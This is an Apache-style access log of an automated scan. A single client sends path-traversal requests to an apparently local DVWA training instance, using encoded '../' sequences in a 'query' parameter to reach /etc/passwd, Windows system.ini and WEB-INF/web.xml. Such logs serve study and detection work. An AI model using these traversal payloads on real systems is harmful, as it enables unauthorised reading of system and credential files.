172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 301 588 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 301 734 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 301 588 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 301 734 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=%2Fetc%2Fpasswd HTTP/1.1" 301 564 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 301 718 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=c%3A%2F HTTP/1.1" 301 548 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=c%3A%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=%2F HTTP/1.1" 301 540 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=c%3A%5C HTTP/1.1" 301 548 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=c%3A%5C HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 694 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=WEB-INF%2Fweb.xml HTTP/1.1" 301 568 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs?query=WEB-INF%5Cweb.xml HTTP/1.1" 301 568 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:09 +0000] "GET /docs/?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 301 610 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 301 734 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 301 588 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 301 734 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=%2Fetc%2Fpasswd HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 301 718 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=c%3A%2F HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=c%3A%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=%2F HTTP/1.1" 301 540 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=c%3A%5C HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=c%3A%5C HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 694 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=WEB-INF%2Fweb.xml HTTP/1.1" 301 568 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=WEB-INF%5Cweb.xml HTTP/1.1" 301 568 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 301 574 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 301 742 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 301 596 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 301 742 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=%2Fetc%2Fpasswd HTTP/1.1" 301 572 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=%2Fetc%2Fpasswd HTTP/1.1" 200 1722 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 301 726 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=c%3A%2F HTTP/1.1" 301 556 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=c%3A%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /docs/DVWA_v1.3.pdf?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=%2F HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=c%3A%5C HTTP/1.1" 301 556 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=c%3A%5C HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 301 702 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=WEB-INF%2Fweb.xml HTTP/1.1" 301 576 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=WEB-INF%2Fweb.xml HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=WEB-INF%5Cweb.xml HTTP/1.1" 301 576 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css/?query=WEB-INF%5Cweb.xml HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:10 +0000] "GET /dvwa/css?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 301 582 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
